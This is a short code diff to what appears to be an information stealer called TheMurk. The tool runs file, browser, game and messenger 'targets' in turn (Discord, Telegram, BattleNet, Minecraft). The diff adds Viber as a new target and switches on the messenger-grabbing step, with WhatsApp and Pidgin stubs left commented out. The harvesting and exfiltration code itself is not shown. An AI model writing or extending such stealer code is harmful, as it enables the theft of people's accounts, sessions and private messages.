@@ -12,6 +12,7 @@ from targets.games.battlenet import BattleNet
 from targets.games.minecraft import Minecraft
 from targets.messengers.discord import Discord
 from targets.messengers.telegram import Telegram
+from targets.messengers.viber import Viber
 
 class TheMurk:
     def __init__(self) -> None:
@@ -33,6 +34,7 @@ class TheMurk:
         self.GrabFiles()
         self.Browsers()
         self.Games()
+        self.Messagers()
 
     def Start(self):
         if not config.debuging:
@@ -60,6 +62,6 @@ class TheMurk:
     def Messagers(self):
         self.msgOther = Discord(self.msgOther)
         self.msgOther = Telegram(self.msgOther)
-        #self.msgOther = viber.Viber(self.msgOther)
+        self.msgOther = Viber(self.msgOther)
         #self.msgOther = whatsapp.WhatsApp(self.msgOther)
         #self.msgOther = pidgin.Pidgin(self.msgOther)
